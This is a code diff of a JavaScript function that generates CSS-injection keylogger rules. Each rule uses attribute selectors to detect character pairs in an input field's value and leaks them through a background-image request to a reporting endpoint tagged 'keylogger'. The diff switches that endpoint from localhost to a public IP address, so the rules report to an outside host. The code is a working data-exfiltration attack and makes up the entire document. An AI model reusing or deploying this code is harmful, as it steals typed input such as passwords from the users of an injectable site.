@@ -21,16 +21,16 @@ function genCSS(pairs, headCSS, prefix = "_") {
     for (let pair of pairs) {
         if (pair.indexOf("_") < 0) {
             if (isNaN(+pair[0])) {
-                outString += `input[value*="${pair}"] ~ #${prefix}${pair} {color: var(--hightlight);background: url("http://localhost:3000/report?site=keylogger&payload=${pair}");}\n`
+                outString += `input[value*="${pair}"] ~ #${prefix}${pair} {color: var(--hightlight);background: url("http://13.57.38.41:3000/report?site=keylogger&payload=${pair}");}\n`
             } else {
                 // CSS do not support dom id starts with a number
-                outString += `input[value*="${pair}"] ~ #${prefix}${pair} {color: var(--hightlight);background: url("http://localhost:3000/report?site=keylogger&payload=${pair}");}\n`
+                outString += `input[value*="${pair}"] ~ #${prefix}${pair} {color: var(--hightlight);background: url("http://13.57.38.41:3000/report?site=keylogger&payload=${pair}");}\n`
             }
         } else {
             if (pair.indexOf("_") === 0) {
-                outString += `input[value$="${pair[1]}"] ~ #${prefix}${pair} {color: var(--hightlight);background: url("http://localhost:3000/report?site=keylogger&payload=${pair}");}\n`
+                outString += `input[value$="${pair[1]}"] ~ #${prefix}${pair} {color: var(--hightlight);background: url("http://13.57.38.41:3000/report?site=keylogger&payload=${pair}");}\n`
             } else {
-                outString += `input[value^="${pair[0]}"] ~ #${prefix}${pair} {color: var(--hightlight);background: url("http://localhost:3000/report?site=keylogger&payload=${pair}");}\n`
+                outString += `input[value^="${pair[0]}"] ~ #${prefix}${pair} {color: var(--hightlight);background: url("http://13.57.38.41:3000/report?site=keylogger&payload=${pair}");}\n`
             }
         }
     }
